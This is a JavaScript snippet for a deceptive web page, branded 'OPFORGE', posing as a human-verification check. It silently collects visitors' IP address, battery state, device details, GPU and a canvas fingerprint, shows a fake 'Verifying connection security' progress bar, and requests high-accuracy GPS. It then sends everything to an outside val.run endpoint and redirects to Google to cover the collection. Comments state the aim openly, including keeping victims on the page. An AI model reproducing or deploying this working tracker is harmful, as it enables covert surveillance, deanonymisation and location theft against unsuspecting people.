<script>
  let baseData = {
      ip: "Unknown", device: navigator.userAgent, resolution: window.screen.width + "x" + window.screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language,
      battery: "Unknown", gps: null, cores: navigator.hardwareConcurrency || "Unknown",
      ram: navigator.deviceMemory || "Unknown", gpu: "Unknown", fingerprint: "Unknown"
  };

  // 1. Silent Harvest: IP & Battery
  fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => baseData.ip = d.ip).catch(()=>{});
  if (navigator.getBattery) {
      navigator.getBattery().then(b => { baseData.battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : ""); });
  }

  // 2. Silent Harvest: GPU & Canvas Fingerprint
  try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
      ctx.fillStyle = "#069"; ctx.fillText("OPFORGE", 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("OPFORGE", 4, 17);
      baseData.fingerprint = canvas.toDataURL().slice(-32); // unique hash
      
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) { baseData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
  } catch(e) {}

  function startTracking() {
      document.getElementById("humanCheck").style.display = "none";
      document.querySelector("label[for='humanCheck']").innerText = "Please wait...";
      document.getElementById("progContainer").style.display = "block";
      document.getElementById("statusText").style.display = "block";

      // Fake scanning sequence to keep them on the page
      let progress = 0;
      const bar = document.getElementById("progBar");
      const status = document.getElementById("statusText");
      
      const interval = setInterval(() => {
          progress += Math.random() * 20;
          if (progress > 90) progress = 90;
          bar.style.width = progress + "%";
          status.innerText = "Verifying connection security...";
      }, 300);

      // Prompt for Location
      if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
              (pos) => {
                  baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
                  finish(interval);
              },
              (err) => {
                  finish(interval); // They hit deny, but we already grabbed everything else
              },
              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
          );
      } else {
          finish(interval);
      }
  }

  function finish(interval) {
      clearInterval(interval);
      document.getElementById("progBar").style.width = "100%";
      document.getElementById("statusText").innerText = "Success. Redirecting...";
      
      fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(baseData)
      }).finally(() => {
          window.location.href = "https://www.google.com";
      });
  }
</script>
